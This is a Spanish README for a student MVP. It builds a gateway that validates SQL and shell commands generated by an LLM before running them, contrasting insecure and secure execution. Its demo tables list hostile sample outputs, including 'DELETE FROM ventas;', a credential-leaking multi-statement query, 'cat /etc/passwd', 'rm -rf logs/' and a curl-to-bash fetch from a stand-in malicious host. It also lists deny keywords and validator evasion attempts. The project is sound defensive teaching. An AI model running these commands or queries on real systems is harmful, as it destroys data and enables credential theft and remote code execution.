# MVP — Mini Security Gateway de Salida para LLMs (SQL Injection y Command Injection)

> **Enfoque del proyecto:** Construimos un **mini security gateway de salida**: intercepta lo que
> genera el LLM, lo valida contra una allow-list y lo ejecuta con mínimo privilegio. Es el núcleo de
> lo que sería un Security Gateway completo para LLMs.

| | |
|---|---|
| Curso | Fundamentos de Seguridad de la Información — Seminario |
| Riesgo estudiado | OWASP Top 10 for LLM Applications 2025 — **LLM05: Improper Output Handling** |
| Caso real de referencia | **CVE-2024-5565** (Vanna.AI): el SQL/código generado por el LLM se ejecutaba sin validar |
| Vectores | **1. SQL Injection** · **2. Command Injection** |
| Estado | Funcional y probado de punta a punta el 2026-10-22 (Windows 11, Java 23, Maven 3.9.12, modo simulación) |

---

## 1. Problema

Una aplicación le pide al LLM que traduzca lenguaje natural a **SQL** o a un **comando de shell** y
ejecuta lo que el LLM devuelve. Si la petición es maliciosa ("Quiero borrar todas las ventas") o el
modelo se equivoca, el LLM genera una salida peligrosa (`DELETE FROM ventas;`) y la aplicación la
ejecuta con sus propios privilegios.

**Idea central del MVP:** la salida del LLM es entrada no confiable. Hay que **validar lo que genera
el LLM antes de ejecutarlo** y ejecutarlo con **mínimo privilegio**.

## 2. Alcance

El MVP muestra cada vector en dos versiones lado a lado:

| | Vector 1: SQL | Vector 2: Command |
|---|---|---|
| **Insegura** | Ejecuta todas las sentencias que genera el LLM, sin validar | Pasa el texto del LLM a un shell (`bash -c` / `powershell -Command`) |
| **Segura (el gateway)** | `SqlValidator` + conexión SQLite de solo lectura | `CommandValidator` + ejecución **sin shell** |

## 3. Arquitectura del mini security gateway (lo implementado)

```
 Usuario (navegador · index.html)
        │  pregunta en lenguaje natural
        ▼
 ┌──────────────── APP JAVA · JDK HttpServer :8000 (App.java) ────────────────┐
 │   /insecure-sql   /secure-sql   /insecure-cmd   /secure-cmd   /reset-db     │
 └───────────────────────────────┬────────────────────────────────────────────┘
                                 ▼
              LLM (LlmClient.java)
              · API de Anthropic si hay ANTHROPIC_API_KEY
              · simulador local por palabras clave si no hay clave
                                 │
                                 │  SALIDA DEL LLM: SQL o comando   ◄── punto de riesgo (LLM05)
                                 ▼
        ┌── /insecure-* ─────────┴───────── /secure-* ──┐
        │                                                │
        ▼                                                ▼
  Ejecución directa              ┌─ OUTPUT SECURITY LAYER ─────────────────────┐
  · SQL: todas las sentencias    │  SqlValidator                                │
  · CMD: shell (bash/powershell) │   · una sola sentencia, solo SELECT          │
        │                        │   · palabras prohibidas (drop, delete, ...)  │
        │                        │   · allow-list de tablas: clientes, ventas   │
        │                        │  CommandValidator                            │
        │                        │   · rechaza metacaracteres ; && & || | ` $( <│
        │                        │   · allow-list de verbos: ls pwd date whoami │
        │                        │   · allow-list de argumentos (solo ls -la..) │
        │                        └──────────────┬───────────────────────────────┘
        │                          BLOQUEADO ◄──┤ válido
        │                                       ▼
        │                        ┌─ EJECUCIÓN CON MÍNIMO PRIVILEGIO ────────────┐
        │                        │  SQL: SQLite en modo solo lectura (mode=ro)  │
        │                        │  CMD: ProcessBuilder con tokens, SIN shell   │
        │                        └──────────────┬───────────────────────────────┘
        ▼                                       ▼
 ┌──────────────────────── Respuesta JSON al navegador ────────────────────────┐
 │   { "generado": <salida del LLM>, "resultado": <efecto o BLOQUEADO: motivo> } │
 └─────────────────────────────────────────────────────────────────────────────┘
```

El gateway actúa sobre la **salida** del LLM: no importa cómo se obtuvo esa salida, si no pasa la
validación no se ejecuta.

## 4. Componentes

| Archivo | Responsabilidad |
|---|---|
| `src/main/java/com/fdsi/mvp/App.java` | Servidor HTTP, endpoints, ejecución insegura y segura, restauración de la BD |
| `src/main/java/com/fdsi/mvp/LlmClient.java` | Llamada a la API de Anthropic o simulador local sin costo |
| `src/main/java/com/fdsi/mvp/SqlValidator.java` | Validación estructurada del SQL generado |
| `src/main/java/com/fdsi/mvp/CommandValidator.java` | Allow-list de comandos y argumentos, rechazo de metacaracteres |
| `src/main/java/com/fdsi/mvp/DbInit.java` | Crea `ventas.db`: 10 clientes, 30 ventas y la tabla ficticia `secretos_demo` |
| `src/main/resources/static/index.html` | Interfaz con ejemplos (legítimos y ataques) y botón "Restaurar base de datos" |

Stack: Java 17+ (probado con 23), Maven, SQLite (`org.xerial:sqlite-jdbc` 3.46.1.0), sin frameworks.

### Datos de prueba (`ventas.db`)

| Tabla | Contenido |
|---|---|
| `clientes` | 10 clientes ficticios de 7 ciudades de Colombia |
| `ventas` | 30 ventas (agosto–septiembre 2026): laptops, celulares, monitores, tablets, periféricos |
| `secretos_demo` | 2 credenciales **ficticias** (`API_KEY_DEMO`, `DB_PASSWORD_DEMO`): el objetivo de los ataques de fuga |

## 5. Controles implementados

### 5.1 Vector SQL — `SqlValidator` + solo lectura

| Control | Qué detiene |
|---|---|
| Rechaza `;` intermedio (una sola sentencia) | Encadenar `SELECT ...; SELECT * FROM secretos_demo` |
| Solo permite consultas que empiezan por `SELECT` | `DELETE`, `DROP`, `UPDATE`, `INSERT` |
| Palabras prohibidas: `drop delete update insert alter attach detach pragma replace vacuum load_extension` | Escritura, cambios de esquema o carga de extensiones escondidos en la consulta |
| Rechaza cualquier mención a `secretos_demo` | Fuga de la tabla sensible |
| Allow-list de tablas: revisa **todas** las tablas de `FROM`/`JOIN`, listas con comas, subconsultas y nombres entre comillas | Lectura de otras tablas (`sqlite_master`, etc.) |
| Conexión SQLite en modo solo lectura | Segunda barrera: aunque algo pase el validador, no puede escribir |

### 5.2 Vector Command — `CommandValidator` + sin shell

| Control | Qué detiene |
|---|---|
| Rechaza `;` `&&` `&` `\|\|` `\|` `` ` `` `$(` `>` `<` salto de línea | Encadenar comandos, tuberías, segundo plano, sustitución, redirección |
| Allow-list cerrada de verbos: `ls`, `pwd`, `date`, `whoami` | `cat`, `rm`, `curl`, `bash`, etc. |
| Allow-list de argumentos: solo opciones de `ls` (`-l`, `-a`, `-la`...), ninguna ruta | Listar directorios del sistema (`ls -la /etc`) o formatos raros (`date +%s`) |
| `ProcessBuilder` recibe la lista de tokens, **sin** intérprete de shell | Segunda barrera: un metacarácter que se escape no se interpreta |

Se usa **allow-list** (se permite solo lo conocido) y no deny-list (bloquear lo peligroso), porque
una deny-list se elude con variantes.

## 6. Casos de la demo (resultados verificados)

Resultados obtenidos el 2026-10-22 con el servidor corriendo en **modo simulación** (sin API key).
Con un LLM real la salida generada puede variar; los validadores actúan igual.

### 6.1 SQL

| Botón | El LLM genera | Insegura | Segura |
|---|---|---|---|
| 🟢 Consulta legítima | `SELECT cliente_id, SUM(monto) FROM ventas GROUP BY cliente_id` | Totales de los 10 clientes | Los mismos totales |
| 🔴 Ataque 1: DELETE | `DELETE FROM ventas;` | Borra las 30 ventas ("Filas afectadas: 30") | `BLOQUEADO: solo se permiten consultas SELECT` |
| 🔴 Ataque 2: fuga | `SELECT * FROM secretos_demo;` | Muestra las 2 credenciales ficticias | `BLOQUEADO: tabla no autorizada` |
| 🔴 Ataque 3: múltiples sentencias | `SELECT * FROM ventas; SELECT * FROM secretos_demo;` | Ejecuta ambas: lista las ventas **y** filtra las credenciales | `BLOQUEADO: múltiples sentencias no están permitidas` |

Después del Ataque 1 se pulsa **"♻️ Restaurar base de datos"** para recuperar los datos.

### 6.2 Command

| Botón | El LLM genera | Insegura | Segura |
|---|---|---|---|
| 🟢 Comando legítimo | `date` | Fecha y hora del shell real | Fecha y hora (sin shell) |
| 🔴 Ataque 1: concatenación | `ls; whoami; cat /etc/passwd` | Fuga de `/etc/passwd` (simulada) | `BLOQUEADO: metacaracter de shell (;)` |
| 🔴 Ataque 2: destructivo | `ls && rm -rf logs/` | Borrado de logs (simulado) | `BLOQUEADO: metacaracter de shell (&&)` |
| 🔴 Ataque 3: reverse shell | `curl -s http://malicioso.com/exploit.sh \| bash` | RCE / reverse shell (simulada) | `BLOQUEADO: metacaracter de shell (\|)` |

### 6.3 Intentos de evasión del validador (probados)

| Salida del LLM | Resultado en la versión segura |
|---|---|
| `SELECT name, sql FROM clientes, sqlite_master` | BLOQUEADO: tabla fuera de la allow-list (`sqlite_master`) |
| `SELECT * FROM (SELECT * FROM sqlite_master)` | BLOQUEADO: tabla fuera de la allow-list |
| `SELECT * FROM "sqlite_master"` | BLOQUEADO: tabla fuera de la allow-list |
| `SELECT load_extension('x')` | BLOQUEADO: palabra clave no permitida |
| `ls -la /etc` | BLOQUEADO: argumento no permitido |
| `whoami & calc` | BLOQUEADO: metacaracter de shell (`&`) |
| `SELECT c.nombre, SUM(v.monto) FROM clientes c JOIN ventas v ON ...` | PASA (consulta legítima con JOIN y alias) |
| `SELECT * FROM ventas WHERE monto > (SELECT AVG(monto) FROM ventas)` | PASA (subconsulta sobre tabla permitida) |

### 6.4 Simulaciones declaradas

En la versión insegura de comandos, los ataques (`/etc/passwd`, `rm`/`logs`, `curl`/`bash`)
devuelven una respuesta **simulada** que describe el efecto real, para no destruir nada ni abrir
conexiones durante la demo. Solo se ejecutan de verdad en el shell `date`, `whoami`, `pwd`, `ls` y
`ls -la`; cualquier otro comando se muestra como "se habría ejecutado en el shell del servidor". Así
la demo es segura incluso con un LLM real. La vulnerabilidad es la misma: el texto del LLM llega sin
validar al intérprete.

Los ataques SQL **sí se ejecutan de verdad** sobre `ventas.db`, que es desechable y se restaura con
el botón o con `DbInit`.

## 7. Cómo ejecutar

Requisitos: JDK 17+ y Maven 3.8+. En PowerShell, desde la carpeta del proyecto:

```powershell
cd "D:\Archivos universidad\Fundamentos de seguridad de la informacion\mvp_seminario_fdsi_java\Salidas-inseguras-con-LLM-"

# Modo simulación (sin costo): asegura que no haya clave en esta terminal
Remove-Item Env:ANTHROPIC_API_KEY -ErrorAction SilentlyContinue

# 1. Crear / reiniciar la base de datos de prueba
mvn compile exec:java "-Dexec.mainClass=com.fdsi.mvp.DbInit"

# 2. Levantar el servidor
mvn compile exec:java
```

Abrir **http://localhost:8000**. La consola indica si se usa el simulador o la API real. Detener
con `Ctrl+C`.

- Para restaurar los datos durante la demo: botón **"♻️ Restaurar base de datos"** (o repetir el paso 1).
- En PowerShell, el argumento `-D...` va entre comillas completo, como arriba.
- Para usar un LLM real: definir `ANTHROPIC_API_KEY` (y opcionalmente `MODEL_NAME`) en la terminal
  o en un `.env`. Nunca escribir la clave en el código.

Alternativa con jar:

```powershell
mvn package
java -cp target/mvp-llm-output-handling-1.0.0-jar-with-dependencies.jar com.fdsi.mvp.DbInit
java -jar target/mvp-llm-output-handling-1.0.0-jar-with-dependencies.jar
```

## 8. Correcciones aplicadas (2026-10-22)

| # | Problema encontrado | Corrección |
|---|---|---|
| 1 | La conexión de solo lectura (`ventas.db?mode=ro`) no abría la BD: la consulta legítima en modo seguro fallaba | Forma URI `jdbc:sqlite:file:ventas.db?mode=ro`: lee bien y rechaza escrituras (`SQLITE_READONLY`) |
| 2 | `mvn exec:java -Dexec.mainClass=...DbInit` ignoraba la clase y arrancaba el servidor: la BD nunca se recreaba | La clase principal pasa a ser una propiedad en `pom.xml`, que la línea de comandos sí puede cambiar |
| 3 | En el Ataque SQL 3 la versión insegura solo ejecutaba la primera sentencia y no se veía la fuga | La versión insegura ejecuta todas las sentencias, como una app que confía en el LLM |
| 4 | La allow-list de tablas solo revisaba la primera tabla (`FROM clientes, sqlite_master` pasaba) | Se revisan todas las tablas, subconsultas y nombres entre comillas |
| 5 | `CommandValidator` no revisaba argumentos (`ls -la /etc` pasaba) ni `&` simple | Allow-list de argumentos y `&` añadido a los metacaracteres |
| 6 | La versión insegura ejecutaba de verdad cualquier comando no simulado | Solo ejecuta de verdad comandos inofensivos; el resto se simula |
| 7 | La versión segura decía "éxito" cuando el comando fallaba | Devuelve el error real |
| 8 | Campo para pegar la API key en el código | Eliminado: solo variable de entorno o `.env` |
| 9 | Modelo por defecto posiblemente inválido y sin aviso del modo | Modelo `claude-sonnet-5-5` por defecto; la consola indica simulador o API |
| 10 | Avisos de SLF4J en consola y tildes rotas en la salida de PowerShell | Logger vacío (`slf4j-nop`) y salida de PowerShell en UTF-8 |
| 11 | Solo 6 ventas y 4 clientes | 30 ventas, 10 clientes y 2 credenciales ficticias; botón para restaurar la BD |

### Limitaciones conocidas

- Los validadores usan reglas y expresiones regulares, no un analizador SQL completo. Por eso existe
  la segunda barrera (solo lectura / sin shell): si algo se escapa, no puede escribir ni encadenar.
- En Windows, `ls -la` en la versión insegura muestra un error de PowerShell (su `ls` no acepta
  `-la`). No afecta a los ejemplos de la demo.
- Con un LLM real, la salida generada puede variar respecto a la tabla de §6.
- No hay métricas automatizadas ni registro de auditoría (fuera de alcance).

## 9. Guion de demo (5 minutos)

1. **Contexto (30 s):** LLM05 y CVE-2024-5565. La salida del LLM se ejecuta sin validar. Presentar
   el enfoque: un mini security gateway de salida que se pone entre el LLM y lo que se ejecuta.
2. **SQL legítimo (30 s):** "Ejecutar ambos": las dos versiones responden igual.
3. **SQL Ataques 2, 3 y 1 (1 min 30 s):** insegura filtra credenciales y borra las ventas; segura
   bloquea y explica el motivo. Pulsar "Restaurar base de datos".
4. **Command Ataques 1, 2 y 3 (1 min 30 s):** insegura "compromete" el servidor; segura bloquea por
   metacarácter o allow-list.
5. **Cierre (1 min):** dos capas en la versión segura: validación de la salida + mínimo privilegio
   (solo lectura, sin shell). Allow-list en lugar de deny-list.

## 10. Fuera de alcance

- **Security Gateway completo** (proxy independiente entre cualquier aplicación y el proveedor del
  LLM): trabajo futuro. Este MVP es su capa de salida, embebida en la aplicación.
- Métricas automatizadas y registro de auditoría.
- Otros tipos de salida insegura (XSS, código, texto fuera de tema).

## 11. Referencias

- OWASP Top 10 for LLM Applications 2025 — LLM05: Improper Output Handling.
- CVE-2024-5565 — Vanna.AI, ejecución de código a partir de la salida del LLM.
- OWASP — SQL Injection Prevention Cheat Sheet; OS Command Injection Defense Cheat Sheet.
